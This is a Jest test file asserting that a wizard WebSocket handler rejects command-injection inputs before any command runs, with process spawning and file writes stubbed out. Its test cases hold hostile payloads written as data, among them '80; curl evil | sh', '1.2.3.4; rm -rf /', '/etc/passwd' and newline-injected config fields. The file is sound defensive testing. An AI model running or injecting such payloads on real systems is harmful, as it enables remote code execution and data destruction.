// src/websocket/__tests__/WizardHandler.injection.test.ts
//
// Proves that command-injection payloads reaching the wizard are neutralised by
// strict validation *before* any command is executed. Each malicious value is
// rejected (the handler throws) so execution never happens — no shell, no argv.
//
// The handlers are the real ones, so this suite must never be able to reach the
// host: if a validator regressed, an injected value would otherwise have been
// written over a hostapd config, /etc/passwd or the PPPoE profile with `sudo mv`
// before the test turned red. Every command goes through utils/exec, stubbed
// here to record what would have run; child_process itself throws, so a path
// that bypasses utils/exec fails loudly instead of spawning; fs writes are
// recorded, never made. After each rejection, nothing may have been recorded.

import { WizardHandler } from '../WizardHandler';
import { WizardCommand } from '../types';
import * as exec from '../../utils/exec';
import * as fs from 'fs';

jest.mock('../../utils/exec', () => {
  const ran = async () => ({ stdout: '', stderr: '', exitCode: 0 });
  return {
    ...jest.requireActual('../../utils/exec'),
    execute_command: jest.fn(ran),
    execute_argv: jest.fn(ran),
    execute_argv_input: jest.fn(ran),
  };
});

jest.mock('child_process', () => {
  const forbidden = (name: string) => () => {
    throw new Error(`child_process.${name} called from the injection suite: it must never spawn a process`);
  };
  return Object.fromEntries(
    ['exec', 'execFile', 'execSync', 'execFileSync', 'spawn', 'spawnSync', 'fork'].map((name) => [name, forbidden(name)]),
  );
});

jest.mock('fs', () => ({
  ...jest.requireActual('fs'),
  writeFileSync: jest.fn(),
  appendFileSync: jest.fn(),
  copyFileSync: jest.fn(),
  renameSync: jest.fn(),
  unlinkSync: jest.fn(),
}));

/** Every command the handlers would have run, and every file they would have written. */
function sideEffects(): unknown[][] {
  const mocks = [
    exec.execute_command, exec.execute_argv, exec.execute_argv_input,
    fs.writeFileSync, fs.appendFileSync, fs.copyFileSync, fs.renameSync, fs.unlinkSync,
  ] as unknown as jest.Mock[];
  return mocks.flatMap((mock) => mock.mock.calls);
}

function cmd(feature: string, action: string, params: Record<string, unknown>): WizardCommand {
  return { id: 'test', type: 'action', feature: feature as any, action, params };
}

describe('the injection suite cannot reach the host', () => {
  beforeEach(() => jest.clearAllMocks());

  it('records a validated command instead of running it', async () => {
    await new WizardHandler().handleCommand(cmd('vm', 'start_vm', { vmName: 'Windows' }));
    expect(exec.execute_argv).toHaveBeenCalledWith('virsh', ['-c', 'qemu:///system', 'start', 'Windows']);
  });
});

describe('WizardHandler — injection payloads are rejected before execution', () => {
  let handler: WizardHandler;

  beforeEach(() => {
    jest.clearAllMocks();
    handler = new WizardHandler();
  });

  afterEach(() => {
    // Shown as argv lists when a validator regresses: what would have run.
    expect(sideEffects()).toEqual([]);
  });

  it.each(['constructor', 'toString', '__proto__', 'hasOwnProperty'])(
    'rejects the inherited Object member "%s" as an action',
    async (action) => {
      await expect(handler.handleCommand(cmd('vm', action, {}))).rejects.toThrow('Unknown action');
    },
  );

  it('rejects an injected VM name (start_vm)', async () => {
    await expect(handler.handleCommand(cmd('vm', 'start_vm', { vmName: 'Windows; reboot' })))
      .rejects.toThrow('Invalid vmName parameter');
  });

  it('rejects an option-like VM name (force_stop_vm)', async () => {
    await expect(handler.handleCommand(cmd('vm', 'force_stop_vm', { vmName: '--all' })))
      .rejects.toThrow('Invalid vmName parameter');
  });

  it('rejects an injected firewall zone (add_port)', async () => {
    await expect(handler.handleCommand(cmd('firewall', 'add_port', { port: '80', zone: 'public; reboot' })))
      .rejects.toThrow('Invalid zone parameter');
  });

  it('rejects an injected port (add_port)', async () => {
    await expect(handler.handleCommand(cmd('firewall', 'add_port', { port: '80; curl evil | sh', zone: 'public' })))
      .rejects.toThrow('Invalid port parameter');
  });

  it('rejects an injected forward destination address (add_forward)', async () => {
    await expect(handler.handleCommand(cmd('firewall', 'add_forward', {
      port: '80', toPort: '80', protocol: 'tcp', zone: 'public', toAddr: '1.2.3.4; rm -rf /',
    }))).rejects.toThrow('Invalid toAddr parameter');
  });

  it('rejects an injected interface name (set_interface_zone)', async () => {
    await expect(handler.handleCommand(cmd('network', 'set_interface_zone', {
      interface: 'eth0; reboot', zone: 'public',
    }))).rejects.toThrow('Invalid interface parameter');
  });

  it('rejects an arbitrary configPath outside the allow-list (delete_network)', async () => {
    await expect(handler.handleCommand(cmd('wifi', 'delete_network', { configPath: '/etc/passwd' })))
      .rejects.toThrow('Invalid configPath parameter');
  });

  it('rejects a newline-injected SSID (add_network)', async () => {
    await expect(handler.handleCommand(cmd('wifi', 'add_network', {
      ssid: 'evil\ninterface=wlan9', password: 'password123',
    }))).rejects.toThrow('Invalid characters in ssid or password');
  });

  it('rejects newline-injected PPPoE credentials (set_credentials)', async () => {
    await expect(handler.handleCommand(cmd('pppoe', 'set_credentials', {
      username: 'user\npassword=leak', password: 'secret',
    }))).rejects.toThrow('Invalid characters in username or password');
  });

  it('still routes a harmless command that needs no execution (wizard get_state)', async () => {
    const state = await handler.handleCommand(cmd('wizard', 'get_state', {})) as any;
    expect(state).toHaveProperty('steps');
    expect(Array.isArray(state.steps)).toBe(true);
  });
});
